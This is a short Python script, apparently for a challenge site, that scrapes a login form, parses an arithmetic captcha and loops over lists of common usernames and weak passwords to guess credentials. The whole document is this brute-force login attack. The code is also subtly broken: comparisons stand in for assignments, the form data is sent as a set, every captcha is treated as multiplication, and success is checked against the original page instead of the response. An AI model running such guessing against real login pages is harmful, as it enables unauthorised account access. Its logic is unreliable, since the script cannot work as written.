from bs4 import BeautifulSoup
import requests
import json

#html
html_text = requests.get("https://afeladat2017.whiteshield.net/login").text 
soup = BeautifulSoup(html_text,"lxml")
form = soup.find("form", action="/login")

#get elements
username = form.find("input", id="id_username")
password = form.find("input", id="id_password")
math= form.find("span", id="math").text
math_input = form.find("input", id="id_captcha_1")    

#get elements from succes page
succes_div = soup.find("div", class_="container")
succes_text = succes_div.find("article").find("h1").text
print(succes_text)


#login options
usernames=["root","john","admin","printer"]
passwords=["password","1234","qwerty","admin"]
Pass=[]


#using defined elements and options  
for u_element in usernames:
        username == u_element
        # if "Logged in" in form.text:
        #     print(f"The username was:{u_element}")
        for p_element in passwords:
            password == p_element
            Pass.append(p_element)

            first_math = int(math[0])
            operator = math[1]
            second_math = int(math[-2])
            math_input = first_math * second_math

            # #press Submit button
            s= requests.session()
            serviceurl ="https://afeladat2017.whiteshield.net/login"
            payload={u_element,p_element,math_input}
            r = s.post(serviceurl, data=payload)
            print(r.content)
           

            #succes
            if "Success!" in succes_text:
                print("Logged in")
                print(f"The password was:{Pass}")
                print(f"{first_math} * {second_math} = {math_input}")

            #failure->again    
            else:
                requests.get("https://afeladat2017.whiteshield.net/login").text  #html_text->html code
                BeautifulSoup(html_text,"lxml")
                print("fail")



